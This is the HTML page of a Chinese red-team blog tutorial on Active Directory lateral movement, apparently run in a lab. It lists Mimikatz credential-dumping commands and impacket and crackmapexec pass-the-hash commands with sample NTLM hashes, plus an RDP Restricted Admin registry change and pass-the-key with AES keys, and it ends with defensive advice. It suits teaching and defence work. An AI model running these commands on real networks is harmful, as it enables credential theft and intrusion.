@@ -1,0 +1,411 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>域渗透之横向移动 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="PTH (Pass The Hash - 哈希传递攻击)Pass The Hash 是一种经典的横向移动技术，攻击者无需破解明文密码，直接使用 NTLM Hash 进行身份认证。 凭证获取首先需要从目标系统中提取凭证信息： 使用 Mimikatz： 123456# 提取密码哈希privilege::debugsekurlsa::logonpasswords# 或使用 hashdumplsadump">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透之横向移动">
+<meta property="og:url" content="https://www.52jl.top/2026/02/15/yu1/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="PTH (Pass The Hash - 哈希传递攻击)Pass The Hash 是一种经典的横向移动技术，攻击者无需破解明文密码，直接使用 NTLM Hash 进行身份认证。 凭证获取首先需要从目标系统中提取凭证信息： 使用 Mimikatz： 123456# 提取密码哈希privilege::debugsekurlsa::logonpasswords# 或使用 hashdumplsadump">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-12.webp">
+<meta property="article:published_time" content="2026-02-15T02:49:03.000Z">
+<meta property="article:modified_time" content="2026-02-15T03:36:40.389Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="Kerberos">
+<meta property="article:tag" content="NTLM">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-12.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "域渗透之横向移动",
+  "url": "https://www.52jl.top/2026/02/15/yu1/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-12.webp",
+  "datePublished": "2026-02-15T02:49:03.000Z",
+  "dateModified": "2026-02-15T03:36:40.389Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/15/yu1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '域渗透之横向移动',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260214a"><meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/systeminfo-risk/"><i class="fa-fw fas fa-shield-halved"></i><span> systeminfo 补丁风险分析</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">域渗透之横向移动</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/systeminfo-risk/"><i class="fa-fw fas fa-shield-halved"></i><span> systeminfo 补丁风险分析</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">域渗透之横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-15T02:49:03.000Z" title="发表于 2026-02-15 10:49:03">2026-02-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-15T03:36:40.389Z" title="更新于 2026-02-15 11:36:40">2026-02-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="PTH-Pass-The-Hash-哈希传递攻击"><a href="#PTH-Pass-The-Hash-哈希传递攻击" class="headerlink" title="PTH (Pass The Hash - 哈希传递攻击)"></a>PTH (Pass The Hash - 哈希传递攻击)</h1><p>Pass The Hash 是一种经典的横向移动技术，攻击者无需破解明文密码，直接使用 NTLM Hash 进行身份认证。</p>
+<h2 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h2><p>首先需要从目标系统中提取凭证信息：</p>
+<p><strong>使用 Mimikatz：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提取密码哈希</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 hashdump</span></span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 MSF：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+
+<h2 id="PTH-之-IPC-横向移动"><a href="#PTH-之-IPC-横向移动" class="headerlink" title="PTH 之 IPC 横向移动"></a>PTH 之 IPC 横向移动</h2><p>IPC (Inter-Process Communication) 是 Windows 系统中用于进程间通信的机制，可通过命名管道建立会话。</p>
+<h3 id="Mimikatz-PTH-注入"><a href="#Mimikatz-PTH-注入" class="headerlink" title="Mimikatz PTH 注入"></a>Mimikatz PTH 注入</h3><p>使用 Mimikatz 将凭证注入到新进程中，实现横向移动：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:sqladmin /domain:0day /ntlm:518b98ad4178a53695dc997aa02d455c /run:<span class="string">&quot;powershell -w hidden&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明：</strong></p>
+<ul>
+<li><code>/user</code>: 目标用户名</li>
+<li><code>/domain</code>: 目标域名</li>
+<li><code>/ntlm</code>: NTLM 哈希值</li>
+<li><code>/run</code>: 要启动的进程</li>
+</ul>
+<p><img src="/2026/02/15/yu1/9.png" loading='lazy'></p>
+<p>执行成功后，会弹出一个具有目标用户权限的 PowerShell 进程：</p>
+<p><img src="/2026/02/15/yu1/8.png" loading='lazy'></p>
+<p>随后可通过 IPC 连接建立会话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.142\ipc$ /user:0day\sqladmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/15/yu1/7.png" loading='lazy'></p>
+<h2 id="PTH-之-AT-计划任务横向"><a href="#PTH-之-AT-计划任务横向" class="headerlink" title="PTH 之 AT 计划任务横向"></a>PTH 之 AT 计划任务横向</h2><p>AT 命令用于在远程主机上创建计划任务执行命令，适用于 Windows Server 2008 及更早版本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-atexec -hashes :518b98ad4178a53695dc997aa02d455c 0day/sqladmin@192.168.3.142 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>优点：</strong> 无需交互式 Shell，适合执行单条命令<br><strong>缺点：</strong> 新版 Windows 已弃用 AT 命令，推荐使用 schtasks</p>
+<hr>
+<h2 id="PTH-之-WMI-横向"><a href="#PTH-之-WMI-横向" class="headerlink" title="PTH 之 WMI 横向"></a>PTH 之 WMI 横向</h2><p>WMI (Windows Management Instrumentation) 是 Windows 系统管理的核心组件，可远程执行命令且无文件落地。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Impacket 工具</span></span><br><span class="line">proxychains impacket-wmiexec -hashes :518b98ad4178a53695dc997aa02d455c 0day/sqladmin@192.168.3.142</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 CrackMapExec</span></span><br><span class="line">crackmapexec smb 192.168.3.142 -u sqladmin -H 518b98ad4178a53695dc997aa02d455c -x <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/15/yu1/2.png" loading='lazy'></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li>无需写入磁盘，隐蔽性强</li>
+<li>需要目标开放 135 端口（RPC）</li>
+<li>需要管理员权限</li>
+</ul>
+<hr>
+<h2 id="PTH-之-SMB-横向"><a href="#PTH-之-SMB-横向" class="headerlink" title="PTH 之 SMB 横向"></a>PTH 之 SMB 横向</h2><p>通过 SMB 协议远程执行命令，原理是通过 SMB 上传可执行文件到目标系统并执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-smbexec -hashes :518b98ad4178a53695dc997aa02d455c 0day/sqladmin@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/15/yu1/1.png" loading='lazy'></p>
+<p><strong>特点：</strong></p>
+<ul>
+<li>需要目标开放 445 端口</li>
+<li>会在目标系统创建服务（可能触发告警）</li>
+<li>执行完毕后自动清理服务</li>
+</ul>
+<hr>
+<h2 id="PTH-之-DCOM-横向"><a href="#PTH-之-DCOM-横向" class="headerlink" title="PTH 之 DCOM 横向"></a>PTH 之 DCOM 横向</h2><p>DCOM (Distributed Component Object Model) 是 Windows 分布式组件对象模型，可用于远程代码执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-dcomexec -hashes :518b98ad4178a53695dc997aa02d455c 0day/sqladmin@192.168.3.132</span><br></pre></td></tr></table></figure>
+
+<p><strong>常用 DCOM 对象：</strong></p>
+<ul>
+<li>MMC20.Application</li>
+<li>ShellWindows</li>
+<li>ShellBrowserWindow</li>
+</ul>
+<p><strong>优点：</strong> 相比 WMI 更隐蔽，日志记录较少</p>
+<hr>
+<h2 id="PTH-之-PSEXEC-横向"><a href="#PTH-之-PSEXEC-横向" class="headerlink" title="PTH 之 PSEXEC 横向"></a>PTH 之 PSEXEC 横向</h2><p>PSExec 是 Sysinternals 套件中的经典工具，通过 SMB 协议在远程系统创建服务执行命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-psexec -hashes :518b98ad4178a53695dc997aa02d455c 0day/sqladmin@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/15/yu1/3.png" loading='lazy'></p>
+<p><strong>工作流程：</strong></p>
+<ol>
+<li>通过 SMB 连接到目标的 ADMIN$ 共享</li>
+<li>上传 PSEXESVC.exe 到 System32 目录</li>
+<li>通过 SCM (Service Control Manager) 创建并启动服务</li>
+<li>执行完毕后删除服务</li>
+</ol>
+<p><strong>注意事项：</strong></p>
+<ul>
+<li>会产生大量日志（Event ID 7045）</li>
+<li>需要目标开放 445 端口</li>
+<li>需要管理员权限</li>
+</ul>
+<h2 id="PTH-之-RDP-横向"><a href="#PTH-之-RDP-横向" class="headerlink" title="PTH 之 RDP 横向"></a>PTH 之 RDP 横向</h2><p>通过哈希值直接登录 RDP，无需明文密码。</p>
+<h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><ol>
+<li><p><strong>受限管理员模式 (Restricted Admin Mode)</strong></p>
+<ul>
+<li>Windows 8.1 &#x2F; Server 2012 R2 及以上版本支持</li>
+<li>需要启用受限管理员模式</li>
+</ul>
+</li>
+<li><p><strong>启用方法：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在目标机器上执行</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>权限要求：</strong> 仅对管理员组成员有效</p>
+</li>
+</ol>
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p>使用 Mimikatz 注入凭证并启动 RDP 客户端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:sqladmin /domain:OWA2010SP3 /ntlm:518b98ad4178a53695dc997aa02d455c <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明：</strong></p>
+<ul>
+<li><code>/restrictedadmin</code>: 启用受限管理员模式，允许使用哈希认证</li>
+</ul>
+<p><img src="/2026/02/15/yu1/4.png" loading='lazy'></p>
+<p>执行后会弹出 RDP 客户端，输入目标 IP 即可直接连接，无需再次输入密码。</p>
+<p><strong>注意事项：</strong></p>
+<ul>
+<li>目标必须开启受限管理员模式</li>
+<li>部分安全加固的环境可能禁用此功能</li>
+<li>连接会留下 RDP 登录日志（Event ID 4624）</li>
+</ul>
+<hr>
+<h1 id="PTK-Pass-The-Key-密钥传递攻击"><a href="#PTK-Pass-The-Key-密钥传递攻击" class="headerlink" title="PTK (Pass The Key - 密钥传递攻击)"></a>PTK (Pass The Key - 密钥传递攻击)</h1><h2 id="攻击背景"><a href="#攻击背景" class="headerlink" title="攻击背景"></a>攻击背景</h2><p>当目标系统满足以下条件时，传统的 PTH 攻击将失效：</p>
+<ul>
+<li>安装了 KB2871997 补丁</li>
+<li>禁用了 NTLM 认证协议</li>
+<li>强制使用 Kerberos 认证</li>
+</ul>
+<p>此时可以使用 Pass The Key 攻击，通过 AES 密钥进行 Kerberos 认证。</p>
+<h2 id="PTH-vs-PTK-的区别"><a href="#PTH-vs-PTK-的区别" class="headerlink" title="PTH vs PTK 的区别"></a>PTH vs PTK 的区别</h2><table>
+<thead>
+<tr>
+<th>攻击方式</th>
+<th>使用凭证</th>
+<th>加密方式</th>
+<th>认证协议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Pass The Hash</td>
+<td>NTLM Hash</td>
+<td>RC4</td>
+<td>NTLM</td>
+</tr>
+<tr>
+<td>Pass The Key</td>
+<td>AES Key (128&#x2F;256)</td>
+<td>AES</td>
+<td>Kerberos</td>
+</tr>
+</tbody></table>
+<h2 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><h3 id="1-获取-AES-Key"><a href="#1-获取-AES-Key" class="headerlink" title="1. 获取 AES Key"></a>1. 获取 AES Key</h3><p>使用 Mimikatz 导出 AES 密钥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/15/yu1/6.png" loading='lazy'></p>
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 123456</span><br><span class="line">User Name         : sqladmin</span><br><span class="line">Domain            : 0DAY</span><br><span class="line">AES256 hmac       : 55022d214e5259a17c13d8cb051491b932e39cfafe64dd05d4eee3dbd6fb05e6</span><br><span class="line">AES128 hmac       : 8a7c42f3d8e9a1b2c3d4e5f6a7b8c9d0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-传递-AES-Key"><a href="#2-传递-AES-Key" class="headerlink" title="2. 传递 AES Key"></a>2. 传递 AES Key</h3><p>使用获取的 AES256 密钥进行认证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:sqladmin /domain:0day /aes256:55022d214e5259a17c13d8cb051491b932e39cfafe64dd05d4eee3dbd6fb05e6 /run:powershell</span><br></pre></td></tr></table></figure>
+
+<p><strong>优势：</strong></p>
+<ul>
+<li>绕过 NTLM 禁用限制</li>
+<li>使用 Kerberos 认证，更隐蔽</li>
+<li>AES 加密强度更高，不易被检测</li>
+</ul>
+<p><strong>适用场景：</strong></p>
+<ul>
+<li>高安全环境（禁用 NTLM）</li>
+<li>域控强制 Kerberos 认证</li>
+<li>需要更隐蔽的横向移动</li>
+</ul>
+<hr>
+<h1 id="PTT-Pass-The-Ticket-票据传递攻击"><a href="#PTT-Pass-The-Ticket-票据传递攻击" class="headerlink" title="PTT (Pass The Ticket - 票据传递攻击)"></a>PTT (Pass The Ticket - 票据传递攻击)</h1><p>票据传递攻击是 Kerberos 认证体系中的高级攻击技术，通过窃取或伪造 Kerberos 票据实现权限维持和横向移动。</p>
+<p><strong>内容预告：</strong></p>
+<ul>
+<li>Golden Ticket（黄金票据）</li>
+<li>Silver Ticket（白银票据）</li>
+<li>TGT&#x2F;TGS 票据注入</li>
+<li>票据导出与重放</li>
+<li>Kerberos 委派攻击</li>
+</ul>
+<p>详细内容将在下一篇文章《域渗透之权限维持》中深入讲解。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了域环境中常见的横向移动技术：</p>
+<p><strong>Pass The Hash (PTH)：</strong></p>
+<ul>
+<li>IPC、AT、WMI、SMB、DCOM、PSEXEC、RDP 等多种方式</li>
+<li>适用于 NTLM 认证环境</li>
+<li>需要管理员权限</li>
+</ul>
+<p><strong>Pass The Key (PTK)：</strong></p>
+<ul>
+<li>使用 AES 密钥进行 Kerberos 认证</li>
+<li>绕过 NTLM 禁用限制</li>
+<li>更隐蔽，适合高安全环境</li>
+</ul>
+<p><strong>Pass The Ticket (PTT)：</strong></p>
+<ul>
+<li>基于 Kerberos 票据的攻击</li>
+<li>下篇文章详细展开</li>
+</ul>
+<p><strong>防御建议：</strong></p>
+<ol>
+<li>启用 LSASS 保护（PPL）</li>
+<li>禁用 NTLM 认证，强制 Kerberos</li>
+<li>限制管理员账户的横向移动</li>
+<li>部署 EDR 监控异常登录行为</li>
+<li>定期轮换高权限账户密码</li>
+<li>启用 Windows Defender Credential Guard</li>
+</ol>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a><a class="post-meta__tags" href="/tags/Kerberos/">Kerberos</a><a class="post-meta__tags" href="/tags/NTLM/">NTLM</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2026/02/12/exchange/" title="Exchange 后渗透利用"><img class="cover" src="/img/covers/shinchan-cover-10.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Exchange 后渗透利用</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script>
+(() => {
+  const imageSelectors = "#article-container img, #recent-posts img, .article-sort-item-img img";
+  const addFallback = (img) => {
+    if (!img || img.dataset.ipFallbackBound === "1") return;
+    img.dataset.ipFallbackBound = "1";
+    img.addEventListener("error", () => {
+      const original = img.getAttribute("src") || "";
+      if (!original) return;
+      if (img.dataset.ipFallbackDone === "1") return;
+      img.dataset.ipFallbackDone = "1";
+      if (/\.webp(\?.*)?$/i.test(original)) {
+        img.onerror = () => {
+          img.onerror = null;
+          img.src = original.replace(/\.webp(\?.*)?$/i, ".jpg$1");
+          img.onerror = () => {
+            img.onerror = null;
+            img.src = "/img/404.jpg";
+          };
+        };
+        img.src = original.replace(/\.webp(\?.*)?$/i, ".png$1");
+        return;
+      }
+      img.onerror = null;
+      img.src = "/img/404.jpg";
+    });
+  };
+  const bindAll = () => document.querySelectorAll(imageSelectors).forEach(addFallback);
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", bindAll);
+  } else {
+    bindAll();
+  }
+  document.addEventListener("pjax:complete", bindAll);
+})();
+</script>
+</div></body></html>
